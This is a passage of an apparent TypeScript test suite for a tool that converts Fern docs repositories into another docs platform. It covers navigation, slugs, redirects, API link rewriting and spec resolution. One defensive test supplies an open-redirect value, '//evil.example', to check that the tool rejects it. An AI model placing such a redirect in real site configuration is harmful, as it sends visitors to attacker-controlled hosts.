    writeFileSync(join(root, 'products', 'sdks', 'sdks.yml'), `
navigation:
  - section: Overview
    contents:
      - page: Introduction
        path: ./introduction.mdx
`)
    writeFileSync(join(root, 'products', 'sdks', 'introduction.mdx'), '---\ntitle: Introduction\n---\n\nSDK intro.')
    writeFileSync(join(root, 'products', 'dashboard', 'dashboard.yml'), `
navigation:
  - section: Getting started
    contents:
      - page: Overview
        path: ./pages/overview.mdx
`)
    writeFileSync(join(root, 'products', 'dashboard', 'pages', 'overview.mdx'), '---\ntitle: Overview\n---\n\nDashboard overview.')
    const config = {
      products: [
        { 'display-name': 'SDKs', path: './products/sdks/sdks.yml', slug: 'sdks' },
        { 'display-name': 'Dashboard', path: './products/dashboard/dashboard.yml' },
      ],
    }
    const projected = projectFernNavigation({ config, fernRoot: root })
    expect(projected.warnings.some((warning) => warning.message.includes('not supported'))).toBe(false)
    expect(projected.docsConfig.tabs.map((tab) => tab.tab)).toEqual(['SDKs', 'Dashboard'])
    const sourcePaths = projected.descriptors.map((descriptor) => descriptor.sourcePath).sort()
    expect(sourcePaths).toEqual(['products/dashboard/pages/overview.mdx', 'products/sdks/introduction.mdx'])
    // The SDKs product's own `slug: sdks` becomes its route prefix; the
    // Dashboard product falls back to its slugified display-name.
    const sdksTab = projected.docsConfig.tabs.find((tab) => tab.tab === 'SDKs')!
    const dashboardTab = projected.docsConfig.tabs.find((tab) => tab.tab === 'Dashboard')!
    expect(JSON.stringify(sdksTab)).toContain('sdks/overview/introduction')
    expect(JSON.stringify(dashboardTab)).toContain('dashboard/getting-started/overview')
  })

  it('skips an unreadable product but keeps importing the rest, with a warning naming it', () => {
    const root = mkdtempSync(join(tmpdir(), 'thally-migrate-fern-products-missing-'))
    mkdirSync(join(root, 'products', 'ok'), { recursive: true })
    writeFileSync(join(root, 'products', 'ok', 'ok.yml'), 'navigation:\n  - page: Hello\n    path: ./hello.mdx\n')
    writeFileSync(join(root, 'products', 'ok', 'hello.mdx'), '---\ntitle: Hello\n---\n\nHi.')
    const config = {
      products: [
        { 'display-name': 'Missing', path: './products/missing/missing.yml' },
        { 'display-name': 'Ok', path: './products/ok/ok.yml' },
      ],
    }
    const projected = projectFernNavigation({ config, fernRoot: root })
    expect(projected.docsConfig.tabs.map((tab) => tab.tab)).toEqual(['Ok'])
    expect(projected.warnings.some((warning) => warning.message.includes('Missing') && warning.message.includes('does not exist'))).toBe(true)
  })

  it('rejects a protocol-relative redirect destination and translates a trailing wildcard', () => {
    const root = mkdtempSync(join(tmpdir(), 'thally-migrate-fern-redirects-'))
    const config = {
      navigation: [{ page: 'Welcome', path: 'welcome.mdx' }],
      redirects: [
        { source: '/evil', destination: '//evil.example' },
        { source: '/old/*', destination: '/new/*' },
      ],
    }
    const projected = projectFernNavigation({ config, fernRoot: root })
    expect(projected.docsConfig.redirects).not.toContainEqual(
      expect.objectContaining({ source: '/evil' }),
    )
    expect(projected.docsConfig.redirects).toContainEqual({
      source: '/old/:path*',
      destination: '/new/:path*',
    })
  })

  it('projects tabs, nested sections with skip-slug, navbar links, redirects, OpenAPI, assets, and component renames', () => {
    const bundle = migrateRepository({
      repositoryDir: fernFixture(),
      sourceUrl: 'https://github.com/acme/fern-docs',
    })

    expect(bundle.platform).toBe('fern')
    // Tabs/sections default to their slugified label (confirmed against a live
    // Fern site's sitemap); only `skip-slug: true` (on a tab, section, or page)
    // omits that segment, and `slug` overrides the label.
    expect(bundle.pages.map((page) => page.id).sort()).toEqual([
      'guides/advanced/config',
      'guides/install',
      'guides/open-ai',
      'guides/reference',
      'guides/reference/detail',
      'pinned-page',
      'welcome',
    ])
    // "OpenAI" -> "open-ai": Fern splits camelCase/acronym boundaries when it
    // slugifies a label, unlike the shared Mintlify/Docusaurus slugifier.
    expect(bundle.pages.map((page) => page.id)).toContain('guides/open-ai')
    // A section's own `path` makes it a clickable landing page hosted at the
    // section's own segment, not a further-nested page segment.
    expect(bundle.pages.find((page) => page.id === 'guides/reference')?.title).toBe('Reference overview')
    // A page's frontmatter `slug` replaces its entire section hierarchy.
    expect(bundle.pages.find((page) => page.id === 'pinned-page')?.title).toBe('Pinned')
    expect(bundle.docsConfig.tabs.find((tab) => tab.tab === 'Guides')?.groups).toEqual([
      {
        group: 'Getting Started',
        pages: [
          'guides/install',
          'guides/open-ai',
          'pinned-page',
          { group: 'Reference', pages: ['guides/reference', 'guides/reference/detail'] },
          { group: 'Advanced', pages: ['guides/advanced/config'] },
        ],
      },
    ])
    expect(bundle.docsConfig.navbar?.links).toEqual([
      { label: 'GitHub', href: 'https://github.com/acme/acme', type: 'github' },
    ])
    expect(bundle.docsConfig.redirects).toContainEqual({ source: '/old-install', destination: '/guides/install' })
    const apiTab = bundle.docsConfig.tabs.find((tab) => tab.api)
    expect(apiTab?.api?.source).toBe('openapi/openapi.yml')
    expect(bundle.assets.map((asset) => asset.path)).toContain('images/logo.svg')
    expect(bundle.pages.find((page) => page.id === 'welcome')?.body).toContain('<Warning>Read this first.</Warning>')
    expect(bundle.pages.find((page) => page.id === 'welcome')?.body).toContain('![Logo](/images/logo.svg)')
    expect(bundle.pages.find((page) => page.id === 'guides/install')?.body).toContain('<CodeGroup>')
    expect(bundle.pages.find((page) => page.id === 'guides/install')?.body).toContain('<Tip>Done.</Tip>')
    // Fern renders a bare `{word}` in prose as literal text; Thally's MDX
    // pipeline would otherwise throw evaluating it as an undefined JS ref.
    expect(bundle.pages.find((page) => page.id === 'guides/install')?.body).toContain('connection to \\{vendor\\} failed')
    expect(bundle.pages.find((page) => page.id === 'guides/advanced/config')?.body).toContain('<ParamField name="apiKey" type="string" required>')
    expect(bundle.warnings).toContainEqual(expect.objectContaining({
      code: 'unsupported-config',
      message: expect.stringContaining('EndpointRequestSnippet'),
    }))
    // Fern only serves pages reachable from docs.yml navigation; an
    // unreferenced file must not be imported as an orphan (unlike Mintlify).
    expect(bundle.pages.map((page) => page.id)).not.toContain('orphan')
    // `title`/`colors.accent-primary` map into the same `site` field Mintlify
    // branding already populates. Fern's light/dark are normal (each names
    // the mode it paints); they're swapped here onto Mintlify's inverted
    // `{light, dark}` keys so `updateSiteConfig` has one consistent contract.
    expect(bundle.site).toEqual({ name: 'Acme Docs', colors: { light: '#70E155', dark: '#008700' } })
  })

  it('rewrites in-content links to Fern auto-generated operation pages to the matching Thally /api/ route', () => {
    const root = mkdtempSync(join(tmpdir(), 'thally-migrate-fern-api-link-rewrite-'))
    const fernRoot = join(root, 'fern')
    mkdirSync(join(fernRoot, 'apis', 'rest'), { recursive: true })
    writeFileSync(join(fernRoot, 'fern.config.json'), JSON.stringify({ organization: 'acme' }))
    writeFileSync(join(fernRoot, 'docs.yml'), `
navigation:
  - page: Guide
    path: guide.mdx
  - section: API Reference
    contents:
      - api: REST API
        api-name: rest
        skip-slug: true
`)
    writeFileSync(join(fernRoot, 'apis', 'rest', 'generators.yml'), 'api:\n  specs:\n    - openapi: openapi.yml\n')
    writeFileSync(join(fernRoot, 'apis', 'rest', 'openapi.yml'), [
      'openapi: 3.1.0',
      'info: { title: REST, version: "1.0" }',
      'paths:',
      '  /v2/publish/{destination}:',
      '    post:',
      '      summary: Publish a Message',
      '      responses: { "200": { description: ok } }',
    ].join('\n'))
    writeFileSync(join(fernRoot, 'guide.mdx'), [
      '---',
      'title: Guide',
      '---',
      '',
      'See [publish](/api-reference/publish-a-message) for details.',
    ].join('\n'))

    const bundle = migrateRepository({ repositoryDir: root, sourceUrl: 'https://github.com/acme/fern-docs' })

    const guide = bundle.pages.find((page) => page.id === 'guide')
    expect(guide?.body).toContain('[publish](/api/default/v2/publish/destination/post)')
    expect(guide?.body).not.toContain('/api-reference/publish-a-message')
  })

  it('leaves a link to the source of an authored Fern redirect for that redirect', () => {
    const root = mkdtempSync(join(tmpdir(), 'thally-migrate-fern-api-link-redirect-'))
    const fernRoot = join(root, 'fern')
    mkdirSync(join(fernRoot, 'apis', 'rest'), { recursive: true })
    writeFileSync(join(fernRoot, 'fern.config.json'), JSON.stringify({ organization: 'acme' }))
    writeFileSync(join(fernRoot, 'docs.yml'), [
      'navigation:',
      '  - page: Guide',
      '    path: guide.mdx',
      '  - section: API Reference',
      '    contents:',
      '      - api: REST API',
      '        api-name: rest',
      '        skip-slug: true',
      'redirects:',
      '  - source: /api-reference/publish-a-message',
      '    destination: /guide',
      '',
    ].join('\n'))
    writeFileSync(join(fernRoot, 'apis', 'rest', 'generators.yml'), 'api:\n  specs:\n    - openapi: openapi.yml\n')
    writeFileSync(join(fernRoot, 'apis', 'rest', 'openapi.yml'), [
      'openapi: 3.1.0',
      'info: { title: REST, version: "1.0" }',
      'paths:',
      '  /v2/publish/{destination}:',
      '    post:',
      '      summary: Publish a Message',
      '      responses: { "200": { description: ok } }',
    ].join('\n'))
    writeFileSync(join(fernRoot, 'guide.mdx'), '---\ntitle: Guide\n---\n\nSee [publish](/api-reference/publish-a-message) and [other](/api-reference/other-operation).')
    const bundle = migrateRepository({ repositoryDir: root, sourceUrl: 'https://github.com/acme/fern-docs' })
    const body = bundle.pages.find((page) => page.id === 'guide')?.body ?? ''
    expect(body).toContain('[publish](/api-reference/publish-a-message)')
    expect(body).toContain('[other](/api)')
    expect(bundle.docsConfig.redirects).toContainEqual({ source: '/api-reference/publish-a-message', destination: '/guide' })
  })

  it('matches Fern operation pages by their route (own node slug included) and by operationId method name, not just the summary', () => {
    // Confirmed against a live Fern site (VapiAI): an `api:` node without
    // `skip-slug` adds its own slug to the route ("api-reference/webhooks/
    // ..."), and when `operationId` is present ("ToolController_create"),
    // Fern's page slug is that id's last segment ("create"), not
    // kebab(summary) ("create-tool").
    const root = mkdtempSync(join(tmpdir(), 'thally-migrate-fern-api-link-rewrite-real-shape-'))
    const fernRoot = join(root, 'fern')
    mkdirSync(join(fernRoot, 'apis', 'webhooks'), { recursive: true })
    writeFileSync(join(fernRoot, 'fern.config.json'), JSON.stringify({ organization: 'acme' }))
    // Fern navigation is either all-tabs or no-tabs at the top level; a
    // bare page alongside a `tab:` entry is not a valid shape, so the guide
    // page lives in its own "documentation" tab, matching a real docs.yml
    // (confirmed against VapiAI's).
    writeFileSync(join(fernRoot, 'docs.yml'), `
navigation:
  - tab: documentation
    layout:
      - page: Guide
        path: guide.mdx
  - tab: api-reference
    layout:
      - api: API reference
        api-name: api
        skip-slug: true
      - api: Webhooks
        api-name: webhooks
`)
    mkdirSync(join(fernRoot, 'apis', 'api'), { recursive: true })
    writeFileSync(join(fernRoot, 'apis', 'api', 'generators.yml'), 'api:\n  specs:\n    - openapi: openapi.json\n')
    writeFileSync(join(fernRoot, 'apis', 'api', 'openapi.json'), JSON.stringify({
      openapi: '3.0.0',
      info: { title: 'API', version: '1.0' },
      paths: {
        '/tool': {
          post: { summary: 'Create Tool', operationId: 'ToolController_create', tags: ['Tools'], responses: { 200: { description: 'ok' } } },
        },
        '/call/{id}': {
          get: { summary: 'Get Call', operationId: 'CallController_findOne', tags: ['Calls'], responses: { 200: { description: 'ok' } } },
        },
      },
    }))
    writeFileSync(join(fernRoot, 'apis', 'webhooks', 'generators.yml'), 'api:\n  specs:\n    - openapi: openapi.yml\n')
    writeFileSync(join(fernRoot, 'apis', 'webhooks', 'openapi.yml'), [
      'openapi: 3.0.0',
      'info: { title: Webhooks, version: "1.0" }',
      'paths:',
      '  /server:',
      '    post:',
      '      summary: Server Message',
      '      responses: { "200": { description: ok } }',
    ].join('\n'))
    writeFileSync(join(fernRoot, 'guide.mdx'), [
      '---',
      'title: Guide',
      '---',
      '',
      'See [create a tool](/api-reference/tools/create), the',
      '[get call endpoint](/api-reference/calls/get), and the',
      '[server message webhook](/api-reference/webhooks/server-message).',
    ].join('\n'))

    const bundle = migrateRepository({ repositoryDir: root, sourceUrl: 'https://github.com/acme/fern-docs' })

    const guide = bundle.pages.find((page) => page.id === 'documentation/guide')
    expect(guide?.body).toContain('[create a tool](/api/default/tool/post)')
    // `operationId: "CallController_findOne"` maps through the NestJS ->
    // Fern REST-conventional table ("findOne" -> "get"), not a literal
    // kebab of the id's last segment ("find-one").
    expect(guide?.body).toContain('[get call endpoint](/api/default/call/id/get)')
    expect(guide?.body).toMatch(/\[server message webhook\]\(\/api\/[a-z-]+\/server\/post\)/)
    expect(guide?.body).not.toContain('/api-reference/tools/create')
    expect(guide?.body).not.toContain('/api-reference/webhooks/server-message')
  })

  it('rewrites a bare API-tab landing link to the spec landing route, and an unmatched operation link to the same route with one aggregated warning', () => {
    const root = mkdtempSync(join(tmpdir(), 'thally-migrate-fern-api-landing-link-'))
    const fernRoot = join(root, 'fern')
    mkdirSync(join(fernRoot, 'apis', 'rest'), { recursive: true })
    writeFileSync(join(fernRoot, 'fern.config.json'), JSON.stringify({ organization: 'acme' }))
    writeFileSync(join(fernRoot, 'docs.yml'), `
navigation:
  - tab: documentation
    layout:
      - page: Guide
        path: guide.mdx
  - tab: api-reference
    layout:
      - api: API reference
        api-name: rest
        skip-slug: true
`)
    writeFileSync(join(fernRoot, 'apis', 'rest', 'generators.yml'), 'api:\n  specs:\n    - openapi: openapi.yml\n')
    writeFileSync(join(fernRoot, 'apis', 'rest', 'openapi.yml'), [
      'openapi: 3.1.0',
      'info: { title: REST, version: "1.0" }',
      'paths:',
      '  /tool:',
      '    post:',
      '      summary: Create Tool',
      '      operationId: ToolController_create',
      '      tags: [Tools]',
      '      responses: { "200": { description: ok } }',
    ].join('\n'))
    writeFileSync(join(fernRoot, 'guide.mdx'), [
      '---',
      'title: Guide',
      '---',
      '',
      'See the [API reference](/api-reference) for everything, the',
      '[create tool endpoint](/api-reference/tools/create), and the',
      '[deleted endpoint](/api-reference/tools/delete) (removed since).',
    ].join('\n'))

    const bundle = migrateRepository({ repositoryDir: root, sourceUrl: 'https://github.com/acme/fern-docs' })

    const guide = bundle.pages.find((page) => page.id === 'documentation/guide')
    // Bare tab-landing link -> the spec's Thally landing route.
    expect(guide?.body).toContain('[API reference](/api)')
    // Matched operation link -> its real operation route, as before.
    expect(guide?.body).toContain('[create tool endpoint](/api/default/tool/post)')
    // Unmatched operation link -> falls back to the landing route rather
    // than staying broken.
    expect(guide?.body).toContain('[deleted endpoint](/api)')
    expect(guide?.body).not.toContain('/api-reference')
    // Exactly one aggregated warning names the unmatched link.
    const unmatchedWarnings = bundle.warnings.filter((warning) =>
      warning.message.includes('matched no endpoint'))
    expect(unmatchedWarnings).toHaveLength(1)
    expect(unmatchedWarnings[0]!.message).toContain('/api-reference/tools/delete')
  })

  it('disambiguates two api: sections with the same tab label and a self-repeating route segment instead of a redundant "X: X" name', () => {
    const root = mkdtempSync(join(tmpdir(), 'thally-migrate-fern-dup-tab-label-'))
    const fernRoot = join(root, 'fern')
    mkdirSync(join(fernRoot, 'apis', 'rest'), { recursive: true })
    mkdirSync(join(fernRoot, 'apis', 'webhooks'), { recursive: true })
    writeFileSync(join(fernRoot, 'fern.config.json'), JSON.stringify({ organization: 'acme' }))
    // Both `api:` nodes are direct children of "API Reference" sections that
    // share that exact title, so the plain distinguishing-segment fallback
    // would title-case straight back to "API Reference" for the second one.
    writeFileSync(join(fernRoot, 'docs.yml'), `
navigation:
  - page: Welcome
    path: welcome.mdx
  - section: API Reference
    contents:
      - api: REST API
        api-name: rest
  - section: API Reference
    contents:
      - api: Webhooks
        api-name: webhooks
`)
    writeFileSync(join(fernRoot, 'welcome.mdx'), '---\ntitle: Welcome\n---\n\nHello.')
    writeFileSync(join(fernRoot, 'apis', 'rest', 'generators.yml'), 'api:\n  specs:\n    - openapi: openapi.json\n')
    writeFileSync(join(fernRoot, 'apis', 'rest', 'openapi.json'), '{"openapi":"3.0.0","info":{"title":"REST","version":"1.0"},"paths":{}}')
    writeFileSync(join(fernRoot, 'apis', 'webhooks', 'generators.yml'), 'api:\n  specs:\n    - openapi: openapi.json\n')
    writeFileSync(join(fernRoot, 'apis', 'webhooks', 'openapi.json'), '{"openapi":"3.0.0","info":{"title":"Webhooks","version":"1.0"},"paths":{}}')

    const bundle = migrateRepository({ repositoryDir: root, sourceUrl: 'https://github.com/acme/fern-docs' })

    const apiTabs = bundle.docsConfig.tabs.filter((tab) => tab.api)
    expect(apiTabs).toHaveLength(2)
    const labels = apiTabs.map((tab) => tab.tab)
    expect(new Set(labels).size).toBe(2)
    // No tab name is the earlier redundant "API Reference: API Reference".
    expect(labels.every((label) => !/^(.+): \1$/.test(label))).toBe(true)
  })

  it('imports every Fern api: section, each bound to its own tab and spec, instead of only the first', () => {
    const root = mkdtempSync(join(tmpdir(), 'thally-migrate-fern-multi-api-'))
    const fernRoot = join(root, 'fern')
    mkdirSync(join(fernRoot, 'apis', 'rest'), { recursive: true })
    mkdirSync(join(fernRoot, 'apis', 'ws'), { recursive: true })
    writeFileSync(join(fernRoot, 'fern.config.json'), JSON.stringify({ organization: 'acme' }))
    writeFileSync(join(fernRoot, 'docs.yml'), `
navigation:
  - tab: rest-tab
    layout:
      - page: Welcome
        path: welcome.mdx
      - api: REST API
        api-name: rest
  - tab: ws-tab
    layout:
      - api: WebSocket API
        api-name: ws
`)
    writeFileSync(join(fernRoot, 'welcome.mdx'), '---\ntitle: Welcome\n---\n\nHello.')
    writeFileSync(join(fernRoot, 'apis', 'rest', 'generators.yml'), 'api:\n  specs:\n    - openapi: rest-openapi.yml\n')
    writeFileSync(join(fernRoot, 'apis', 'rest', 'rest-openapi.yml'), 'openapi: 3.0.0\ninfo:\n  title: REST\n  version: "1.0"\npaths: {}\n')
    writeFileSync(join(fernRoot, 'apis', 'ws', 'generators.yml'), 'api:\n  specs:\n    - openapi: ws-openapi.yml\n')
    writeFileSync(join(fernRoot, 'apis', 'ws', 'ws-openapi.yml'), 'openapi: 3.0.0\ninfo:\n  title: WS\n  version: "1.0"\npaths: {}\n')

    const bundle = migrateRepository({ repositoryDir: root, sourceUrl: 'https://github.com/acme/fern-docs' })

    const apiTabs = bundle.docsConfig.tabs.filter((tab) => tab.api)
    expect(apiTabs.map((tab) => tab.tab).sort()).toEqual(['Rest Tab', 'Ws Tab'])
    expect(apiTabs.map((tab) => tab.api?.source).sort()).toEqual(['openapi/rest-openapi.yml', 'openapi/ws-openapi.yml'])
    expect(bundle.assets.map((asset) => asset.path).sort()).toEqual(['openapi/rest-openapi.yml', 'openapi/ws-openapi.yml'])
    expect(bundle.warnings.some((warning) => /only the first was imported/i.test(warning.message))).toBe(false)
  })

  it('gives two api: sections nested under the SAME tab their own tabs instead of one overwriting the other (Paradex shape)', () => {
    const root = mkdtempSync(join(tmpdir(), 'thally-migrate-fern-same-tab-multi-api-'))
    const fernRoot = join(root, 'fern')
    mkdirSync(join(fernRoot, 'apis', 'prod_rest'), { recursive: true })
    mkdirSync(join(fernRoot, 'apis', 'testnet_rest'), { recursive: true })
    writeFileSync(join(fernRoot, 'fern.config.json'), JSON.stringify({ organization: 'acme' }))
    // Both api: nodes share the same display title AND live inside the same
    // top-level "portal" tab, in separate sections distinguished only by
    // their own `slug` — exactly Paradex's real docs.yml shape.
    writeFileSync(join(fernRoot, 'docs.yml'), `
navigation:
  - tab: portal
    layout:
      - page: Welcome
        path: welcome.mdx
      - section: Production API Reference
        slug: prod
        contents:
          - api: REST Endpoints
            api-name: prod_rest
      - section: Testnet API Reference
        slug: testnet
        contents:
          - api: REST Endpoints
            api-name: testnet_rest
`)
    writeFileSync(join(fernRoot, 'welcome.mdx'), '---\ntitle: Welcome\n---\n\nHello.')
    writeFileSync(join(fernRoot, 'apis', 'prod_rest', 'generators.yml'), 'api:\n  specs:\n    - openapi: openapi.json\n')
    writeFileSync(join(fernRoot, 'apis', 'prod_rest', 'openapi.json'), '{"openapi":"3.0.0","info":{"title":"Prod","version":"1.0"},"paths":{}}')
    writeFileSync(join(fernRoot, 'apis', 'testnet_rest', 'generators.yml'), 'api:\n  specs:\n    - openapi: openapi.json\n')
    writeFileSync(join(fernRoot, 'apis', 'testnet_rest', 'openapi.json'), '{"openapi":"3.0.0","info":{"title":"Testnet","version":"1.0"},"paths":{}}')

    const bundle = migrateRepository({ repositoryDir: root, sourceUrl: 'https://github.com/acme/fern-docs' })

    const apiTabs = bundle.docsConfig.tabs.filter((tab) => tab.api)
    // Both specs are bound, on two distinct tabs, each to its own file —
    // not one tab overwritten by the other.
    expect(apiTabs).toHaveLength(2)
    expect(new Set(apiTabs.map((tab) => tab.api?.source)).size).toBe(2)
    expect(bundle.assets.map((asset) => asset.path).sort()).toEqual(['openapi/openapi.json', 'openapi/testnet-rest-openapi.json'])
  })

  it('warns by name instead of silently dropping an AsyncAPI/OpenRPC-only Fern api: section', () => {
    const root = mkdtempSync(join(tmpdir(), 'thally-migrate-fern-asyncapi-'))
    const fernRoot = join(root, 'fern')
    mkdirSync(join(fernRoot, 'apis', 'ws'), { recursive: true })
    writeFileSync(join(fernRoot, 'fern.config.json'), JSON.stringify({ organization: 'acme' }))
    writeFileSync(join(fernRoot, 'docs.yml'), `
navigation:
  - page: Welcome
    path: welcome.mdx
  - api: WebSocket API
    api-name: ws
`)
    writeFileSync(join(fernRoot, 'welcome.mdx'), '---\ntitle: Welcome\n---\n\nHello.')
    writeFileSync(join(fernRoot, 'apis', 'ws', 'generators.yml'), 'api:\n  specs:\n    - asyncapi: asyncapi.yml\n')
    writeFileSync(join(fernRoot, 'apis', 'ws', 'asyncapi.yml'), 'asyncapi: 2.6.0\ninfo:\n  title: WS\n  version: "1.0"\n')

    const bundle = migrateRepository({ repositoryDir: root, sourceUrl: 'https://github.com/acme/fern-docs' })

    expect(bundle.docsConfig.tabs.some((tab) => tab.api)).toBe(false)
    expect(bundle.warnings).toContainEqual(expect.objectContaining({
      code: 'unsupported-config',
      message: expect.stringContaining('AsyncAPI is not supported'),
    }))
    expect(bundle.warnings.find((warning) => warning.message.includes('AsyncAPI'))?.message).toContain('asyncapi.yml')
  })

  it('renders a $$\\begin{align*}...\\end{align*}$$ KaTeX block with the native component', () => {
    const root = mkdtempSync(join(tmpdir(), 'thally-migrate-fern-math-'))
    const fernRoot = join(root, 'fern')
    mkdirSync(fernRoot, { recursive: true })
    writeFileSync(join(fernRoot, 'fern.config.json'), JSON.stringify({ organization: 'acme' }))
    writeFileSync(join(fernRoot, 'docs.yml'), 'navigation:\n  - page: Math\n    path: math.mdx\n')
    writeFileSync(join(fernRoot, 'math.mdx'), [
      '---',
      'title: Math',
      '---',
      '',
      'Some prose before.',
      '',
      '$$',
      '\\begin{align*}',
      '\\text{Bankruptcy Amount} = \\\\',
      '\\max(0, x)',
      '\\end{align*}',
      '$$',
      '',
      "Total is $$4'000$$ today.",
    ].join('\n'))

    const bundle = migrateRepository({ repositoryDir: root, sourceUrl: 'https://github.com/acme/fern-docs' })

    expect(bundle.pages.map((page) => page.id)).toContain('math')
    const page = bundle.pages.find((entry) => entry.id === 'math')
    expect(page?.body).toContain('<Latex block>')
    expect(page?.body).toContain('\\begin{align*}')
    expect(page?.body).toContain('<Latex>{"4\'000"}</Latex>')
    expect(bundle.warnings.some((warning) => warning.message.includes('Math (KaTeX'))).toBe(false)
  })

  it('redirects an underscore-slug link (matching the on-disk folder name) to the hyphenated route Thally actually uses', () => {
    const root = mkdtempSync(join(tmpdir(), 'thally-migrate-fern-slug-alias-'))
    const fernRoot = join(root, 'fern')
    mkdirSync(join(fernRoot, 'baml_client'), { recursive: true })
    writeFileSync(join(fernRoot, 'fern.config.json'), JSON.stringify({ organization: 'acme' }))
    writeFileSync(join(fernRoot, 'docs.yml'), `
navigation:
  - section: Generated baml_client
    slug: baml_client
    contents:
      - page: With options
        path: baml_client/with-options.mdx
`)
    // The in-body link matches the literal, underscore folder name — the
    // form the live Fern site tolerates but Thally's hyphenated route
    // doesn't resolve without an alias redirect.
    writeFileSync(join(fernRoot, 'baml_client', 'with-options.mdx'), '---\ntitle: With options\n---\n\nSee [type builder](/ref/baml_client/with-options).')

    const bundle = migrateRepository({ repositoryDir: root, sourceUrl: 'https://github.com/acme/fern-docs' })

    expect(bundle.pages.map((page) => page.id)).toContain('baml-client/with-options')
    expect(bundle.docsConfig.redirects).toContainEqual({
      source: '/baml_client/with-options',
      destination: '/baml-client/with-options',
    })
  })

  it('redirects every other nav location of a page registered twice to the one that actually gets built, and keeps the sidebar pointing at real content in both places (BoundaryML/baml client-registry repro)', () => {
    const root = mkdtempSync(join(tmpdir(), 'thally-migrate-fern-dup-nav-'))
    const fernRoot = join(root, 'fern')
    mkdirSync(join(fernRoot, 'baml_client'), { recursive: true })
    writeFileSync(join(fernRoot, 'fern.config.json'), JSON.stringify({ organization: 'acme' }))
    // The same source file, `baml_client/client-registry.mdx`, is listed
    // once under an ordinary guide section and again under a `slug:
    // baml_client` reference section — Fern serves the identical content at
    // both `/guide/client-registry` and `/ref/baml-client/client-registry`.
    writeFileSync(join(fernRoot, 'docs.yml'), `
navigation:
  - section: Guide
    contents:
      - page: Client registry
        path: baml_client/client-registry.mdx
  - section: Generated baml_client
    slug: baml_client
    contents:
      - page: Client registry
        path: baml_client/client-registry.mdx
`)
    writeFileSync(join(fernRoot, 'baml_client', 'client-registry.mdx'), '---\ntitle: Client registry\n---\n\nHow to register a client.')

    const bundle = migrateRepository({ repositoryDir: root, sourceUrl: 'https://github.com/acme/baml' })

    // Exactly one page was built, for the first (guide) location.
    expect(bundle.pages.filter((page) => page.title === 'Client registry')).toHaveLength(1)
    expect(bundle.pages.map((page) => page.id)).toContain('guide/client-registry')
    expect(bundle.pages.map((page) => page.id)).not.toContain('baml-client/client-registry')
    // The second location's own derived route redirects to the kept one,
    // instead of dangling as a 404.
    expect(bundle.docsConfig.redirects).toContainEqual({
      source: '/baml-client/client-registry',
      destination: '/guide/client-registry',
    })
    // The `slug: baml_client` alias (a separate class of redirect) also
    // resolves straight to the kept route, not the dropped intermediate id.
    expect(bundle.docsConfig.redirects).toContainEqual({
      source: '/baml_client/client-registry',
      destination: '/guide/client-registry',
    })
    // No redirect (segment-alias or otherwise) ever targets the dropped,
    // non-existent second route.
    expect(bundle.docsConfig.redirects ?? []).not.toContainEqual(
      expect.objectContaining({ destination: '/baml-client/client-registry' }),
    )
    // The sidebar still lists the page at both nav locations — both point
    // at the one id that actually has content.
    const flattenIds = (nodes: Array<string | { pages: Array<unknown> }>): Array<string> => nodes.flatMap((node) => (
      typeof node === 'string' ? [node] : flattenIds(node.pages as Array<string | { pages: Array<unknown> }>)
    ))
    const allNavIds = bundle.docsConfig.tabs.flatMap((tab) => [
      ...flattenIds((tab.pages ?? []) as Array<string | { pages: Array<unknown> }>),
      ...(tab.groups ?? []).flatMap((group) => flattenIds(group.pages as Array<string | { pages: Array<unknown> }>)),
    ])
    expect(allNavIds.filter((id) => id === 'guide/client-registry')).toHaveLength(2)
    expect(allNavIds).not.toContain('baml-client/client-registry')
  })

  it("resolves the first api: node's spec from generators.yml instead of the first OpenAPI file on disk", () => {
    const root = mkdtempSync(join(tmpdir(), 'thally-migrate-fern-generators-'))
    const fernRoot = join(root, 'fern')
    mkdirSync(fernRoot, { recursive: true })
    writeFileSync(join(fernRoot, 'fern.config.json'), JSON.stringify({ organization: 'acme' }))
    writeFileSync(join(fernRoot, 'docs.yml'), `
navigation:
  - page: Welcome
    path: welcome.mdx
  - api: API Reference
`)
    writeFileSync(join(fernRoot, 'generators.yml'), `
api:
  specs:
    - openapi: openapi/configured.yml
`)
    // A decoy that `findOpenApi`'s naive on-disk scan would otherwise pick up
    // first, proving generators.yml is now consulted first.
    writeFileSync(join(fernRoot, 'openapi.yml'), 'openapi: 3.0.0\ninfo:\n  title: Decoy\n  version: "0"\npaths: {}\n')
    mkdirSync(join(fernRoot, 'openapi'), { recursive: true })
    writeFileSync(join(fernRoot, 'openapi', 'configured.yml'), 'openapi: 3.0.0\ninfo:\n  title: Acme API\n  version: "1.0"\npaths: {}\n')
    writeFileSync(join(fernRoot, 'welcome.mdx'), '---\ntitle: Welcome\n---\n\nHello.')

    const bundle = migrateRepository({ repositoryDir: root, sourceUrl: 'https://github.com/acme/fern-docs' })

    const apiTab = bundle.docsConfig.tabs.find((tab) => tab.api)
    expect(apiTab?.api?.source).toBe('openapi/configured.yml')
    expect(bundle.assets.map((asset) => asset.path)).toContain('openapi/configured.yml')
  })

  it("resolves a multi-API repo's generators.yml spec path outside its own API folder but inside the repository (Cohere layout)", () => {
    const root = mkdtempSync(join(tmpdir(), 'thally-migrate-fern-spec-outside-api-'))
    const fernRoot = join(root, 'fern')
    mkdirSync(join(fernRoot, 'apis', 'v2'), { recursive: true })
    writeFileSync(join(fernRoot, 'fern.config.json'), JSON.stringify({ organization: 'acme' }))
    writeFileSync(join(fernRoot, 'docs.yml'), `
navigation:
  - page: Welcome
    path: welcome.mdx
  - api: API Reference
    api-name: v2
`)
    // Written relative to fern/apis/v2/, three levels up lands at the
    // repository root — outside the API folder and outside fern/ itself,
    // but still inside the repository checkout.
    writeFileSync(join(fernRoot, 'apis', 'v2', 'generators.yml'), `
api:
  specs:
    - openapi: ../../../acme-openapi.yaml
`)
    writeFileSync(join(root, 'acme-openapi.yaml'), 'openapi: 3.0.0\ninfo:\n  title: Acme API\n  version: "1.0"\npaths: {}\n')
    writeFileSync(join(fernRoot, 'welcome.mdx'), '---\ntitle: Welcome\n---\n\nHello.')

    const bundle = migrateRepository({ repositoryDir: root, sourceUrl: 'https://github.com/acme/fern-docs' })

    const apiTab = bundle.docsConfig.tabs.find((tab) => tab.api)
    expect(apiTab?.api?.source).toBe('openapi/acme-openapi.yaml')
    expect(bundle.assets.map((asset) => asset.path)).toContain('openapi/acme-openapi.yaml')
    expect(bundle.warnings.some((warning) => /outside the repository/i.test(warning.message))).toBe(false)
  })

  it('warns instead of silently dropping the API when a generators.yml spec path escapes the repository', () => {
